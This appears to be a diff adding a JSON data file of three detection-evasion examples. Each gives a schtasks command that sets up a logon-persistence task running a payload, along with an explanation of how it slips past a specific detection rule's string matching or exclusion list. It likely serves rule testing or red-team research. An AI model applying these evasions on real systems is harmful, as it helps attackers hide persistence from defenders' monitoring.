@@ -1,0 +1,14 @@
+[
+  {
+    "output": "schtasks /create /tn \"Updater HIGHEST\" /tr \"cmd.exe /c payload.exe\" /sc ONLOGON",
+    "explanation": "The rule relies on a 'filter_privs' exclusion list that ignores any command line containing the string 'HIGHEST', 'NT AUT', or ' SYSTEM'. By intentionally injecting 'HIGHEST' into a benign field like the task name, the attacker forces the rule to ignore the malicious execution."
+  },
+  {
+    "output": "schtasks /create /tn \"Updater\" /tr \"cmd.exe /c payload.exe\" /sc \"ONLOGON\"",
+    "explanation": "The 'selection_time' criteria explicitly looks for the string ' ONLOGON ' with both leading and trailing spaces. By wrapping the schedule type in double quotes, the command line parser still accepts the argument, but the string becomes ' \"ONLOGON\" ', successfully evading the exact string match."
+  },
+  {
+    "output": "schtasks /create /tn \"Updater\" /tr \"cmd.exe /c payload.exe\" /sc ONLOGON",
+    "explanation": "Because the rule demands a trailing space (e.g., ' ONLOGON '), placing the schedule type at the absolute end of the command line ensures there is no trailing space after the keyword. This bypasses the selection condition entirely."
+  }
+]
